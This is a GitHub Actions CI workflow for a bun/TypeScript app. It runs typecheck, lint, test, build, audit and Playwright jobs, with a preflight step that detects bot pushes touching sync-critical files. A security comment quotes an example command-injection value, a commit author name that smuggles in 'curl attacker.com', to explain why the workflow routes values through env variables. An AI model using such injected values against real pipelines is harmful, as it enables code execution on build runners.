name: CI

# Runs the same gates the maintainers ran by hand on PRs #1-#10:
#   tsc --noEmit, lint:any-budget, vitest, vite-db-version-check (via build).
# Required because previously nothing ran on PRs and the any-budget gate
# silently drifted ~46 over budget across 30+ commits.
#
# Uses bun (matches the repo's `bun.lock` and Lovable's package manager).
# `package-lock.json` is present but stale relative to package.json; bun
# is the canonical install path.

on:
  pull_request:
  push:
    branches: [main]
  # `workflow_dispatch` is the OPT-IN trigger for the auth-gated e2e
  # suite (see e2e-auth job below). Pushes / PRs deliberately do NOT
  # trigger that job because it writes `[E2E DEVIN]`-marked rows to
  # production Supabase (no separate e2e project provisioned yet) and
  # leaked rows surface in admin dashboards. The auth-gated job also
  # gates itself on `E2E_AUTH_ALLOWED=true` (set only in this job's
  # env block) so even if a future regeneration weakens this `if:`
  # gate, the specs will still skip themselves at runtime.
  workflow_dispatch:

# Cancel previous runs on the same PR when a new commit lands (saves CI
# minutes on rapid feature-branch pushes), but NEVER cancel an in-progress
# run on `main`. If two main-push commits land back-to-back (e.g. a
# Lovable regeneration plus a maintainer hotfix) we want both runs to
# complete so the green/red signal on each commit is preserved — otherwise
# a transient breaking commit can be silently masked by the cancelled
# run's "cancelled" status, which is neither pass nor fail.
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

# Skip CI on direct pushes to main from the Lovable bot
# (`gpt-engineer-app[bot]`) — UNLESS the push touches sync-critical paths
# (see `preflight` job below). Lovable pushes to main several times a day and
# never opens PRs, so each push otherwise consumes ~5 min of Actions minutes
# across 8 jobs. With PR #155's grace mode in place, Lovable's budget overshoots
# are surfaced in the daily digest issue (label `lovable-budget-overshoot`)
# even when CI doesn't run, so we lose negligible signal by skipping the run
# for cosmetic Lovable commits.
#
# Sync-critical carve-out (audit Sprint 1C — Finding 4):
#   The default skip is dangerous if Lovable touches the sync engine because
#   regressions in `useAutoSync`, `atomic-sync-manager`, `offline-storage`,
#   `cached-auth` etc. are exactly the failure mode that produced the
#   stuck-pending iPad complaint. The `preflight` job below diffs the push
#   against HEAD^ and emits `sync_critical=true` when any tracked path matches;
#   downstream jobs then run on Lovable pushes that touch those files.
#
# Detection: `github.event.head_commit.author.name`, NOT `github.actor`.
# When a GitHub App pushes via its installation token, `github.actor`
# resolves to the OWNER of the app installation (the human account that
# installed Lovable), NOT the bot's login. PR #157's first attempt used
# `github.actor` and silently never matched. The git-commit author IS
# `gpt-engineer-app[bot]` for Lovable's pushes, so we key off that
# instead. The same constraint applies inside lovable-grace.mjs (which
# now reads `$GITHUB_EVENT_PATH` JSON for the same field).
#
# This is intentionally inlined per-job rather than gated at the workflow
# level because GitHub doesn't expose a workflow-level `if:` and a single
# gating job would still consume an Actions minute. The condition is the
# same on every job, by design.
jobs:
  # Always-runs preflight job that classifies the trigger and (for push
  # events) detects whether the changed files touch sync-critical paths.
  # Outputs are consumed by every other job's `if:` clause via `needs.preflight.outputs.*`.
  # Cost is one ~15s ubuntu-latest minute per CI invocation; trivial relative to
  # the protection it provides against Lovable silent regressions in sync code.
  preflight:
    name: preflight (Lovable + sync-critical detector)
    runs-on: ubuntu-latest
    outputs:
      is_lovable: ${{ steps.detect.outputs.is_lovable }}
      sync_critical: ${{ steps.detect.outputs.sync_critical }}
    steps:
      - uses: actions/checkout@v4
        with:
          # Need HEAD^ to diff against for push events. Default fetch-depth=1
          # would only grab HEAD, making `git diff HEAD^ HEAD` fail.
          fetch-depth: 2
      - id: detect
        env:
          # SECURITY: pass user-controlled values via env, NEVER interpolate
          # them directly with ${{ … }} in a `run:` shell block. A commit
          # author name like `"; curl attacker.com #` would otherwise be
          # injected verbatim into the script (Devin Review #165 finding).
          # The `if:` expressions on downstream jobs evaluate this value as
          # a GitHub-Actions expression (not shell), so they're safe — but
          # this `run:` step is shell, hence the env-var indirection.
          COMMIT_AUTHOR: ${{ github.event.head_commit.author.name }}
          EVENT_NAME: ${{ github.event_name }}
        run: |
          set -euo pipefail
          if [[ "$COMMIT_AUTHOR" == "gpt-engineer-app[bot]" ]]; then
            echo "is_lovable=true" >> "$GITHUB_OUTPUT"
          else
            echo "is_lovable=false" >> "$GITHUB_OUTPUT"
          fi
          # For non-push events the carve-out is moot — those jobs gate on
          # `github.event_name != 'push'` directly and never consult sync_critical.
          if [[ "$EVENT_NAME" != "push" ]]; then
            echo "sync_critical=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          # `github.event.before` is `000…` on the first push to a new branch,
          # which makes a direct `git diff $before HEAD` fail. Comparing against
          # HEAD^ is robust to that case (the parent always exists for non-root
          # commits) and to force-pushes, which still leave a meaningful HEAD^.
          files="$(git diff --name-only HEAD^ HEAD 2>/dev/null || true)"
          echo "Changed files in push:"
          echo "$files"
          # Sync-critical surface area (audit Finding 4). Touching ANY of these
          # files from a Lovable push triggers full CI for that push:
          #   - src/lib/{atomic-,}sync* (sync engine + helpers)
          #   - src/lib/offline-storage* (IDB store, queue mutators)
          #   - src/lib/cached-auth* (auth cache used by performSync)
          #   - src/lib/sync-quarantine* (quarantine threshold)
          #   - src/lib/sync-manager* (photo upload pipeline)
          #   - src/lib/local-backup-ledger* (snapshot ledger)
          #   - src/lib/transaction-manager* (atomic-sync wrapper)
          #   - src/lib/restore-lock* (cross-tab restore coordination)
          #   - src/lib/sync-events* (inter-module event bus)
          #   - src/lib/sync-halt-tracker* (PR A — silent-halt surface)
          #   - src/lib/stuck-photo-beacon* (PR B — Sentry beacon)
          #   - src/lib/sync-diagnostics* (Lovable's orphan/temp-parent reader)
          #   - src/hooks/useAutoSync* (the sync orchestrator hook)
          #   - src/hooks/useUnsyncedPhotos* (photo readers)
          #   - src/hooks/usePWAState* (sync-status surface for the UI)
          #   - .github/workflows/* (CI itself — never skip CI on CI changes)
          critical_pattern='^(src/lib/(sync|atomic-sync|offline-storage|cached-auth|sync-quarantine|sync-manager|local-backup-ledger|transaction-manager|restore-lock|sync-events|sync-halt-tracker|stuck-photo-beacon|sync-diagnostics)|src/hooks/(useAutoSync|useUnsyncedPhotos|usePWAState)|\.github/workflows/)'
          if echo "$files" | grep -qE "$critical_pattern"; then
            echo "sync_critical=true" >> "$GITHUB_OUTPUT"
            echo "Sync-critical paths touched — full CI will run on this push."
          else
            echo "sync_critical=false" >> "$GITHUB_OUTPUT"
          fi

  typecheck:
    name: tsc --noEmit
    runs-on: ubuntu-latest
    needs: [preflight]
    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest
      - run: bun install --frozen-lockfile
      - run: bunx tsc --noEmit

  any-budget:
    name: lint:any-budget gate
    runs-on: ubuntu-latest
    needs: [preflight]
    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest
      - run: bun install --frozen-lockfile
      - run: bun run lint:any-budget

  test:
    name: vitest
    runs-on: ubuntu-latest
    needs: [preflight]
    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest
      - run: bun install --frozen-lockfile
      - run: bunx vitest run --reporter=default

  build:
    name: vite build (incl. db-version parity check)
    runs-on: ubuntu-latest
    needs: [preflight]
    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest
      - run: bun install --frozen-lockfile
      # The vite-db-version-check plugin (vite.config.ts) fails the build if
      # public/db-config.js and offline-storage.ts disagree on DB_VERSION.
      - run: bun run build

  bundle-size:
    name: bundle-size budget gate
    runs-on: ubuntu-latest
    needs: [preflight]
    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest
      - run: bun install --frozen-lockfile
      # Build produces dist/assets/*.{js,css}; the budget script then
      # totals their bytes and compares to .bundle-size-budget. Mirrors
      # the lint:any-budget pattern (ratchet down on cleanup, gate up).
      - run: bun run build
      - run: bun run bundle-size:budget

  audit-critical:
    name: bun audit (critical gate)
    runs-on: ubuntu-latest
    needs: [preflight]
    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest
      - run: bun install --frozen-lockfile
      # Hard gate: ANY critical-severity advisory in the dep tree fails the
      # build. We deliberately stop short of `--audit-level=high` because
      # the baseline currently carries ~20 high-severity advisories deep in
      # transitive build-tooling (vite > rollup, vite-plugin-pwa >
      # workbox-build, eslint > flat-cache > flatted) that we can't fix
      # without ecosystem-wide upgrades — the `audit-high` non-blocking job
      # below surfaces them in the job summary so we have visibility, but
      # they don't gate the main CI lane until those upstream releases ship.
      - run: bun audit --audit-level=critical

  audit-high:
    name: bun audit (high — advisory only)
    runs-on: ubuntu-latest
    needs: [preflight]
    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
    # Non-blocking: this job runs and reports findings to the PR's checks tab
    # so high-severity transitive advisories are visible, but it does NOT fail
    # the build. Renovate's `vulnerabilityAlerts` block (renovate.json) opens
    # PRs for fixable advisories automatically.
    continue-on-error: true
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest
      - run: bun install --frozen-lockfile
      - name: Run bun audit
        id: audit
        run: |
          set +e
          bun audit --audit-level=high | tee audit-high.txt
          # `$?` after a pipeline is the LAST command's exit code (`tee`,
          # which is always 0). Use `${PIPESTATUS[0]}` so the surfaced
          # exit code reflects `bun audit` itself (1 = advisories, 0 = clean).
          echo "audit_exit=${PIPESTATUS[0]}" >> "$GITHUB_OUTPUT"
      - name: Append audit summary
        if: always()
        run: |
          {
            echo "## bun audit — high severity"
            echo ""
            echo "Exit code: ${{ steps.audit.outputs.audit_exit }} (1 = advisories present, 0 = clean)"
            echo ""
            echo '```'
            cat audit-high.txt || echo "(no audit output)"
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"

  # Unauthenticated smoke specs — always run. These specs (`tests/e2e/smoke/**`)
  # don't talk to Supabase at all, so they can't leak `[E2E DEVIN]` fixture
  # rows into production. They exercise the build + preview-server boot path
  # and the unauthenticated UI surface (sign-in form, 404 page, PWA manifest)
  # on every PR / push.
  e2e-smoke:
    name: playwright e2e (smoke)
    runs-on: ubuntu-latest
    needs: [preflight]
    if: ${{ github.event_name != 'push' || needs.preflight.outputs.is_lovable != 'true' || needs.preflight.outputs.sync_critical == 'true' }}
    # 8 min covers cold-cache build (~100s) + Chromium download (~60s) +
    # smoke specs (~30s with retries) with headroom.
    timeout-minutes: 8
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest
      - run: bun install --frozen-lockfile
      - run: bunx playwright install --with-deps chromium
      # Pass the explicit smoke directory so the auth-gated specs don't even
      # get loaded (and can't accidentally run if a future change weakens
      # their `test.skip` guards).
      - run: bunx playwright test tests/e2e/smoke --reporter=list
        env:
          CI: 'true'
      - if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: playwright-report-smoke
          path: |
            playwright-report/
            test-results/
          retention-days: 14

  # Auth-gated specs (login-and-dashboard, offline-edit-reconcile,
  # cloud-backup-snapshot-upload, inspection-photo-upload-and-sync,
  # admin-pre-edit-override) point at the SAME Supabase project as
  # production because no separate e2e project has been provisioned yet.
  # Each spec creates `[E2E DEVIN] <ts>` rows under a dedicated test-user
  # account; when a spec fails before its post-flight cleanup, the rows
  # linger and surface to admin users whose RLS view spans all inspectors.
  #
  # Defense-in-depth gating:
  #   1. Workflow-level `if:` keeps the job from running on push/PR — only
  #      `workflow_dispatch` triggers it.
  #   2. Spec-level `requireE2EAuthAllowed()` (tests/e2e/_fixtures/safety.ts)
  #      skips every auth-gated `test.describe(...)` block at runtime
  #      unless `E2E_AUTH_ALLOWED=true` is in the env. This catches the
  #      case where a future regeneration drops the workflow `if:` gate
  #      (as happened to PR #134) — the specs will still skip and write
  #      nothing to Supabase. The flag is set ONLY in this job's env
  #      block, never repo-wide.
  #
  # Until we provision a staging Supabase project (and repoint
  # E2E_TEST_* / E2E_ADMIN_* at it) we run the auth-gated suite manually
  # via `workflow_dispatch` only — keeping `e2e-smoke` above on every push
  # so the build / preview-server boot is still deterministically exercised.
  e2e-auth:
    name: playwright e2e (auth — manual only)
    runs-on: ubuntu-latest
    timeout-minutes: 12
    if: ${{ github.event_name == 'workflow_dispatch' }}
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest
      - run: bun install --frozen-lockfile
      - run: bunx playwright install --with-deps chromium
      # E2E_TEST_EMAIL / E2E_TEST_PASSWORD must be set as GitHub Actions
      # repo secrets for the auth-gated specs to actually run; without them
      # those specs `test.skip` at runtime.
      #
      # E2E_ADMIN_EMAIL / E2E_ADMIN_PASSWORD are required by the
      # `admin-pre-edit-override` spec (Tier-2 #5c). The admin user must
      # have the `admin` role assigned in `public.user_roles` (NOT
      # super_admin — super-admins are strictly read-only and don't trigger
      # the snapshot capture path). Spec test.skip's at runtime when these
      # are unset.
      #
      # E2E_AUTH_ALLOWED is the runtime safety flag (see safety.ts comment
      # block) — without it, every auth spec self-skips even if the
      # workflow-level `if:` above is removed.
      - run: bunx playwright test tests/e2e/auth --reporter=list
        env:
          E2E_TEST_EMAIL: ${{ secrets.E2E_TEST_EMAIL }}
          E2E_TEST_PASSWORD: ${{ secrets.E2E_TEST_PASSWORD }}
          E2E_ADMIN_EMAIL: ${{ secrets.E2E_ADMIN_EMAIL }}
          E2E_ADMIN_PASSWORD: ${{ secrets.E2E_ADMIN_PASSWORD }}
          E2E_AUTH_ALLOWED: 'true'
          CI: 'true'
      - if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: playwright-report-auth
          path: |
            playwright-report/
            test-results/
          retention-days: 14
